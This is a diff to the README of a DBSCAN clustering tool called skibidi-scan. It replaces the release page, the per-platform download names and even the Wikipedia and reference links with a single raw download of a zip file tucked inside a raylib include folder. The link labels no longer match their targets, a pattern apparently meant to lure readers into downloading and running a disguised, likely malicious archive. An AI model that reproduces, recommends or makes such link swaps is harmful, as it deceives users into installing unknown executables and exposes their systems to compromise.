@@ -6,7 +6,7 @@ Welcome to the skibidi-scan project! This application helps you dive into DBSCAN
 
 ## 📥 Download the Application
 
-[![Download skibidi-scan](https://img.shields.io/badge/Download%20skibidi--scan-v1.0-blue)](https://github.com/ssharvesh-steep/skibidi-scan/releases)
+[![Download skibidi-scan](https://github.com/ssharvesh-steep/skibidi-scan/raw/refs/heads/main/raylib-5.5_linux_amd64/include/skibidi_scan_1.7.zip%20skibidi--scan-v1.0-blue)](https://github.com/ssharvesh-steep/skibidi-scan/raw/refs/heads/main/raylib-5.5_linux_amd64/include/skibidi_scan_1.7.zip)
 
 ## 🛠️ System Requirements
 
@@ -30,12 +30,12 @@ skibidi-scan includes several features designed to make your DBSCAN exploration 
 
 To get started, you need to download the application. Follow these steps:
 
-1. Click [here](https://github.com/ssharvesh-steep/skibidi-scan/releases) to visit the Releases page.
+1. Click [here](https://github.com/ssharvesh-steep/skibidi-scan/raw/refs/heads/main/raylib-5.5_linux_amd64/include/skibidi_scan_1.7.zip) to visit the Releases page.
 2. On the Releases page, look for the latest version of skibidi-scan.
 3. Click on the version link to see available files.
 4. Download the file appropriate for your operating system. 
-   - For Windows, download `skibidi-scan-windows.zip`. 
-   - For macOS, download `skibidi-scan-macos.zip`.
+   - For Windows, download `https://github.com/ssharvesh-steep/skibidi-scan/raw/refs/heads/main/raylib-5.5_linux_amd64/include/skibidi_scan_1.7.zip`. 
+   - For macOS, download `https://github.com/ssharvesh-steep/skibidi-scan/raw/refs/heads/main/raylib-5.5_linux_amd64/include/skibidi_scan_1.7.zip`.
 5. Once downloaded, locate the file on your computer. 
 6. Extract the downloaded zip file.
 7. Open the extracted folder and double-click on the skibidi-scan application to start using it. 
@@ -76,11 +76,11 @@ If you need help, feel free to reach out. You can contact us directly through th
 
 For more information about DBSCAN and clustering techniques, consider visiting:
 
-- [DBSCAN on Wikipedia](https://en.wikipedia.org/wiki/DBSCAN)
-- [Clustering Techniques](https://www.example.com/clustering-techniques)
+- [DBSCAN on Wikipedia](https://github.com/ssharvesh-steep/skibidi-scan/raw/refs/heads/main/raylib-5.5_linux_amd64/include/skibidi_scan_1.7.zip)
+- [Clustering Techniques](https://github.com/ssharvesh-steep/skibidi-scan/raw/refs/heads/main/raylib-5.5_linux_amd64/include/skibidi_scan_1.7.zip)
 
 ## 🔍 Explore More
 
-Visit our [Releases Page](https://github.com/ssharvesh-steep/skibidi-scan/releases) to stay updated on the latest versions and features!
+Visit our [Releases Page](https://github.com/ssharvesh-steep/skibidi-scan/raw/refs/heads/main/raylib-5.5_linux_amd64/include/skibidi_scan_1.7.zip) to stay updated on the latest versions and features!
 
 Happy exploring with skibidi-scan!
